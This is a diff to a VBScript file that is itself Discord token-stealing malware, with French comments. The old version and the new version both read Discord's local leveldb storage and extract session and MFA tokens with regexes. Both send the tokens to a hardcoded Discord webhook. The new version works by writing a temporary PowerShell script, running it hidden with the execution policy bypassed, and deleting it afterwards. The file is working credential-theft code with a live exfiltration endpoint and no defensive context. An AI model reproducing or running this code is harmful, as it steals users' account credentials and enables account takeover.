@@ -1,40 +1,37 @@
-Dim webhook, fso, discordPath, file, text, tokenPattern, regex, matches, match, http, postData
+Dim shell, fso, tempFolder, psScript, webhook
 webhook = "https://discord.com/api/webhooks/1504566316172837029/fhDisuj783W4JP2bskkTI5dhT60Df8aQtkp9oqsLp7-xADYmaF-mvkCKvYaoNzzjbkTs"
 
+Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-discordPath = fso.GetSpecialFolder(0) & "\..\..\Users\" & CreateObject("WScript.Network").UserName & "\AppData\Roaming\discord\Local Storage\leveldb\"
+tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
 
-If fso.FolderExists(discordPath) Then
-    For Each file In fso.GetFolder(discordPath).Files
-        If LCase(fso.GetExtensionName(file.Name)) = "ldb" Or LCase(fso.GetExtensionName(file.Name)) = "log" Then
-            text = fso.OpenTextFile(file.Path, 1).ReadAll
-            
-            ' Chercher le token standard
-            Set regex = New RegExp
-            regex.Pattern = """token"":""([^""]+)"""
-            regex.IgnoreCase = True
-            regex.Global = True
-            Set matches = regex.Execute(text)
-            
-            For Each match In matches
-                SendToDiscord "Token: " & match.SubMatches(0)
-            Next
-            
-            ' Chercher le token MFA
-            regex.Pattern = "mfa\.[a-zA-Z0-9_-]{80,}"
-            Set matches = regex.Execute(text)
-            
-            For Each match In matches
-                SendToDiscord "Token MFA: " & match.Value
-            Next
-        End If
-    Next
-End If
+psScript = "$path = $env:APPDATA + '\discord\Local Storage\leveldb\';" & _
+           "$webhook = '" & webhook & "';" & _
+           "$result = '';" & _
+           "Get-ChildItem -Path $path -Filter '*.ldb' | ForEach-Object {" & _
+           "  $content = [System.Text.Encoding]::UTF8.GetString([System.IO.File]::ReadAllBytes($_.FullName));" & _
+           "  $pattern = '"""token""":""""([^""""]+)""""';" & _
+           "  $match = [regex]::Match($content, $pattern);" & _
+           "  if($match.Success) { $result += 'Token: ' + $match.Groups[1].Value + '`n' };" & _
+           "  $pattern2 = '(mfa\.[a-zA-Z0-9_-]{80,})';" & _
+           "  $match2 = [regex]::Match($content, $pattern2);" & _
+           "  if($match2.Success) { $result += 'MFA: ' + $match2.Groups[1].Value + '`n' };" & _
+           "};" & _
+           "if($result -ne '') {" & _
+           "  $body = @{content='**Tokens trouvés :**```' + $result + '```'};" & _
+           "  Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'" & _
+           "} else {" & _
+           "  $body = @{content='**Aucun token trouvé**'};" & _
+           "  Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'" & _
+           "}"
 
-Function SendToDiscord(message)
-    Set http = CreateObject("MSXML2.XMLHTTP")
-    postData = "{""content"":""**" & message & "**""}"
-    http.Open "POST", webhook, False
-    http.SetRequestHeader "Content-Type", "application/json"
-    http.Send postData
-End Function
+' Ecrire le script PowerShell dans un fichier temporaire
+Dim psFile
+psFile = tempFolder & "\discord_extract.ps1"
+fso.CreateTextFile(psFile).Write psScript
+
+' Executer le script PowerShell
+shell.Run "powershell -ExecutionPolicy Bypass -File """ & psFile & """", 0, True
+
+' Nettoyer
+fso.DeleteFile psFile, True
